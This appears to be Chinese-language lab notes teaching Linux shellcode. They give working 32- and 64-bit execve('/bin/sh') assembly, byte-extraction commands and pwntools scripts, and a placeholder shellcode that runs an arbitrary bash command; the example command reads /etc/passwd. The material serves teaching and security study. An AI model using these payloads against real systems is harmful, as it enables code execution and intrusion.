# Shellcode初步

Shellcode是一段可由CPU解释执行的机器码，以其经常让攻击者获得shell而得名。在学习编写Shellcode之前，我们会先通过编写Shellcode所对应的汇编来获得直观的理解，然后生成Shellcode。

x86程序使用栈帧来作为传递参数的保存位置，而x64程序使用寄存器来传递参数（分别用rdi, rsi, rdx, rcx, r8, r9作为第1-6个参数）。因此我们分别讨论对于32位和64位程序的常规Shellcode写法。

最后我们介绍了一种占位符式的Shellcode写法。

## 1. 32位

### 1.1. 编写汇编

本质上是编写一个汇编的机器码来调用`execve("/bin/sh", argv, 0)`：
- eax = 0x0b: execve系统调用号
- ebx = "/bin/sh"的地址
- ecx = 参数数组argv的地址
- edx = 环境变量（置0）

将上述所需内容入栈并将栈地址赋给对应寄存器即可，注意尽量避免在汇编代码中包含0（因为大多数Shellcode使用的场景需要依赖字符串拷贝，而对于一些字符串拷贝函数如strcpy，会将0视作截断）。因此我们可以编写如下汇编代码：


```asm
; shellcode32.asm
section .text
global _start

_start:
  ; 通过栈构造"/bin//sh"字符串
  xor  eax, eax       ; 清空eax
  push eax            ; 字符串终止符0x0
  push 0x68732f2f     ; "//sh"
  push 0x6e69622f     ; "/bin"
  mov  ebx, esp       ; ebx指向字符串地址

  ; 设置参数数组
  push eax            ; argv[1] = NULL
  push ebx            ; argv[0] = "/bin//sh"
  mov  ecx, esp       ; ecx指向argv数组

  ; 设置环境变量指针为NULL
  xor  edx, edx       ; edx = 0

  ; 调用execve
  mov  al, 0x0b       ; syscall号：execve=11
  int 0x80            ; 触发系统调用
```

通过以下命令编译、链接、执行，我们可以观察到该程序创建了一个新的shell：

```bash
nasm -f elf32 shellcode32.asm
ld -s -m elf_i386 shellcode32.o -o shellcode32
./shellcode32
# 进入/bin/sh
$ 
```

### 1.2. 生成Shellcode

这里主要介绍两种生成Shellcode文件的方法：

1. 方法一：通过objdump一键提取

```bash
objdump -d shellcode32 | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | perl -pe 's/(..)/\\x\1/g' | tr -d '\n'
# 打印查看提取结果
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
# 一键直接生成codefile_32文件
objdump -d shellcode32 | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | xxd -r -p > codefile_32
# 命令解释：
# objdump -d shellcode32：反汇编二进制文件
# grep -Po '\s\K[a-f0-9]{2}(?=\s)': 提取每一个字节的十六进制格式
# xxd -r -p: 将提取的十六进制转回原始的二进制格式
```

2. 方法二：通过pwntools转换

```python
# 前置要求安装pwntools：pip3 install pwntools
from pwn import *

context.arch = 'i386'
context.os = 'linux'

shellcode_32 = asm('''
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    xor edx, edx
    mov al, 0x0b
    int 0x80
''')

print(f'Shellcode (length: {len(shellcode_32)}):')
print(''.join(f'\\x{b:02x}' for b in shellcode_32))

with open('codefile_32', 'wb') as f:
    f.write(shellcode_32)
```

编译`call_shellcode32`来执行验证上面生成的`codefile_32`：

```bash
cd shellcode
# 注意，在Makefile里我们打开了-z execstack保证栈可执行
make
# 要求codefile_32已经生成在当前路径下
./call_shellcode32
# 看到进入/bin/sh
$
```

## 2. 64位

### 2.1. 编写汇编

64位程序的传参方式和系统调用方式发生了变化，32位通过int 0x80来触发系统调用，而64位使用syscall：
- rax = 0x3b: execve系统调用号
- rdi = "/bin/sh"的地址
- rsi = 参数数组argv的地址
- rdx = 环境变量（置0）

```asm
; shellcode64.asm
section .text
global _start

_start:
  ; 通过寄存器构造"/bin/sh"字符串
  xor  rdx, rdx       ; rdx = 0 (环境变量指针)
  push rdx
  mov  rax, 0x68732f6e69622f2f ; "/bin//sh"
  push rax
  mov  rdi, rsp       ; rdi指向字符串地址

  ; 设置参数数组
  push rdx            ; argv[1] = NULL
  push rdi            ; argv[0] = "/bin//sh"
  mov  rsi, rsp       ; rsi指向argv数组

  ; 调用execve
  xor  rax, rax
  mov  al, 0x3b       ; syscall号：execve=59
  syscall             ; 触发系统调用
```

通过以下命令编译、链接、执行，我们可以观察到该程序创建了一个新的shell：

```bash
nasm -f elf64 shellcode64.asm
ld -s shellcode64.o -o shellcode64
./shellcode64
# 进入/bin/sh
$ 
```

### 2.2. 生成Shellcode

生成方法与上面介绍的为32位生成Shellcode一样

## 3. 占位符式Shellcode

```python
#!/usr/bin/python3
import sys

# You can use this shellcode to run any command you want
shellcode = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   "/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

content = bytearray(200)
content[0:] = shellcode

# Save the binary code to file
with open('codefile_32', 'wb') as f:
  f.write(content)
```

上述占位符式Shellcode（以32位为例）是一种巧妙的设计，通过**动态计算字符串地址**和**运行时修改占位符**的方式，实现灵活的命令执行。其核心原理如下：

1. 初始跳转与地址获取（JMP-CALL-POP 技巧）

```asm
"\xeb\x29"             # jmp short 0x29         ; 跳转到末尾的 CALL 指令
...
"\xe8\xd2\xff\xff\xff" # call 0xffffffd2        ; 实际会跳转到前面的代码，用于获取字符串地址
```

   - jmp short 0x29 跳过后续数据，直接执行末尾的 call 指令。
   - call 指令会将返回地址（即紧随其后的字符串 /bin/bash* 的地址）压栈，然后跳转回前面的代码（通过相对地址计算）。
   - 通过 pop ebx（对应 5b）获取字符串起始地址（即 /bin/bash* 的地址）。

2. 动态构建参数数组

```asm
"\x31\xc0"             # xor eax, eax            ; eax = 0
"\x88\x43\x09"         # mov [ebx+0x9], al       ; 将 ebx+9 处的 '*' 替换为 0x00（终止符）
"\x88\x43\x0c"         # mov [ebx+0xc], al       ; 同上，处理 "-c*"
"\x88\x43\x47"         # mov [ebx+0x47], al      ; 处理命令字符串末尾的 '*'
```

   - 通过 ebx（指向 /bin/bash*）计算偏移，将 * 替换为 0x00，分割字符串为：
   - argv[0] = "/bin/bash"
   - argv[1] = "-c"
   - argv[2] = "/bin/ls -l; echo Hello 32; ..."

3. 设置 execve 参数

```asm
"\x89\x5b\x48"         # mov [ebx+0x48], ebx     ; argv[0] 地址（/bin/bash）
"\x8d\x4b\x0a"         # lea ecx, [ebx+0x0a]     ; argv[1] 地址（-c）
"\x89\x4b\x4c"         # mov [ebx+0x4c], ecx
"\x8d\x4b\x0d"         # lea ecx, [ebx+0x0d]     ; argv[2] 地址（命令字符串）
"\x89\x4b\x50"         # mov [ebx+0x50], ecx
"\x89\x43\x54"         # mov [ebx+0x54], eax     ; argv[3] = NULL
"\x8d\x4b\x48"         # lea ecx, [ebx+0x48]     ; ecx 指向 argv 数组
"\x31\xd2"             # xor edx, edx            ; edx = 0（环境变量）
"\x31\xc0"             # xor eax, eax
"\xb0\x0b"             # mov al, 0x0b            ; execve 系统调用号
"\xcd\x80"             # int 0x80                ; 触发系统调用
```

4. 数据布局与占位符

```asm
"/bin/bash*"           ; argv[0]，* 被替换为 0x00
"-c*"                  ; argv[1]，* 被替换为 0x00
"/bin/ls -l; echo Hello 32; ... *" ; argv[2]，* 被替换为 0x00
"AAAA"                 ; 占位符，将被替换为 argv[0] 的地址
"BBBB"                 ; 占位符，将被替换为 argv[1] 的地址
"CCCC"                 ; 占位符，将被替换为 argv[2] 的地址
"DDDD"                 ; 占位符，将被替换为 NULL
```

   - Shellcode 在运行时通过 ebx 的偏移量计算，通过 mov [ebx+0x48], ebx 等指令动态将 AAAA、BBBB 等占位符替换为实际地址。